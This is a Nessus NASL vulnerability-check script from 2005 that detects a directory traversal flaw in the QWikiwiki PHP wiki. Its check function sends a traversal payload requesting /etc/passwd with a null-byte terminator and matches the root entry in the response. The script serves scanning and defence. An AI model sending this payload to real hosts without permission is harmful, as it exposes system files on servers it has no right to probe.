#
# Script by Noam Rathaus GPLv2
#
#From: Madelman <madelman@iname.com>
#QWikiwiki directory traversal vulnerability
# Date: 2005-01-04 21:31

if(description)
{
 script_id(16100);
 script_version("$Revision: 1.2 $");
 script_cve_id("CAN-2005-0283");
 script_bugtraq_id(12163);
 
 name["english"] = "QWikiwiki directory traversal vulnerability";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running QWikiwiki, a Wiki application written in PHP.

The remote version of this software contains a validation input flaw
which may allow an attacker to use it to read arbitrary files on the 
remote host with the privileges of the web server. 

Solution : Upgrade to the newest version of this software.
Risk factor: High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of a File Inclusion Vulnerability";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Noam Rathaus");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

debug_1 = 0;

function check(loc)
{
 req = http_get (item: string(loc, "/index.php?page=../../../../../../../../../../../etc/passwd%00"), port: port);
 
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if (egrep(pattern:"root:.*:0:0:.*", string:r))
 {
  security_hole(port);
  exit(0);
 }
}


foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
